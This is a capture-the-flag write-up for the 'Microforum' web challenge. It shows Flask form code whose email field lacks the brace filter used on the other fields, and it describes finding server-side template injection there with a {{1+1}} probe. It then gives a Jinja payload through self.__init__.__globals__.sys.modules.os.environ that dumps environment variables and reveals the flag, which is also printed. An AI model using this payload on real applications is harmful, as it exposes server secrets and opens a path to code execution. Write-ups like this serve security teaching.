# Microforum
## Challenge
You're telling me you can't break such a simple [forum](https://microforum.m0lecon.fans/)?

The forum is broken down to 2 things
1. posts
2. profile

## Enumeration 

after looking around in source and testing different places for vulnerabilities we found out that posts aren't vulnerable, but the profile page is.

when looking around in the source code we found these forms

```python
class RegistrationForm(FlaskForm):

	username = StringField('Username', validators=[DataRequired()])

	email = StringField('Email', validators=[DataRequired(), Email()])

	password = PasswordField('Password', validators=[DataRequired()])

	password2 = PasswordField('Repeat Password', validators=[DataRequired(), 
	EqualTo('password')])

	submit = SubmitField('Register')

  

	def validate_username(self, username):

		for c in "}{":

			if c in username.data:

				raise ValidationError('Please use valid characters.')

			user = User.query.filter_by(username=username.data).first()

			if user is not None:

				 raise ValidationError('Please use a different username.')

  

	def validate_email(self, email):

		user = User.query.filter_by(email=email.data).first()

		if user is not None:

			raise ValidationError('Please use a different email address.')

  
  

class EditProfileForm(FlaskForm):

	username = StringField('Username', validators=[DataRequired()])

	about_me = TextAreaField('About me', validators=[Length(min=0, max=1000)])

	submit = SubmitField('Submit')

  

	def __init__(self, original_username, *args, **kwargs):

		super(EditProfileForm, self).__init__(*args, **kwargs)

		self.original_username = original_username

  

	def validate_username(self, username):

		for c in "}{":

			if c in username.data:

				abort(400)

				#raise ValidationError('Please use valid characters.')

		if username.data != self.original_username:

			user = User.query.filter_by(username=self.username.data).first()

			if user is not None:

				abort(409)

				#raise ValidationError('Please use a different username.')

  

	def validate_about_me(self, about_me):

		for c in "}{":

			if c in about_me.data:

				abort(400)

```

We can see that the forms are checking for brackets in username and about me, but never in the email, that means the email might be vulnerable for some SSTI (server side template injection)

When checking for a SSTI we do something like this `{{1+1}}` to see how the server handles that request, and when implementing it to the users email it will look something like this

![[Pasted image 20220514210238.png]]

When logging in and checking if it works on our profile we find this

![[Pasted image 20220514210324.png]]

Okay, so now we know that there is SSTI on this page, but how do we get flag?

## Exploit

We can see in the source again that in the dockerfile we have declared flag as an environment variable, but isn't called anywhere else

```Dockerfile
# syntax=docker/dockerfile:1

FROM python:latest

ENV FLASK_APP=main.py

COPY --chown=root:root . ./microforum

WORKDIR ./microforum

RUN useradd -ms /bin/bash app

RUN chown -R app db/

RUN pip3 install -r requirements.txt

EXPOSE 8080

USER app

ENV FLAG='ptm{REDACTED}'

CMD ["python", "main.py", "--host=0.0.0.0"]
```

The docker is running python which means we can do some code execution through this SSTI, by using the classic `self.__init__.__globals__` path in our SSTI we can find all global variables, and we can see that `sys` is a variable that we have access too.

Through sys we can access variables and load `modules` which with lists us all modules that has been imported and can find the OS module, from there we can load the environmental variables via `os.environ` 

Making our exploit look like this
```
{{self.__init__.__globals__.sys.modules.os.environ}}
```

with this we can put it into our email field and exploit the website giving us this output

![[Pasted image 20220514212413.png]]

## Flag
ptm{d1d_u_f1nd_th3_r1ckr0ll?}
